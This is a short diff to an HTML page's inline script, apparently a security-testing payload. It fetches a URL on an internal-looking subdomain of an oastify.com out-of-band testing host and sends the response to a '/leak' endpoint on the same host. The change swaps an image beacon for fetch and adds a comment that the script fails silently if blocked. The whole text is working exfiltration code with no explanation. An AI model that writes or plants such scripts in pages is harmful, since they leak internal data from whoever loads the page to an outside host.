@@ -7,10 +7,14 @@
     const targetUrl = "http://internal.av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/";
 
     fetch(targetUrl)
-    .then(r => r.text())
-    .then(data => {
-      new Image().src = "https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/leak?value=" + encodeURIComponent(data);
-    });
+      .then(r => {
+        if (r.ok) {
+          return r.text().then(data => {
+            fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/leak?value=" + encodeURIComponent(data));
+          });
+        }
+      });
+    // No .catch — silent fail if blocked
   </script>
 </head>
 <body>
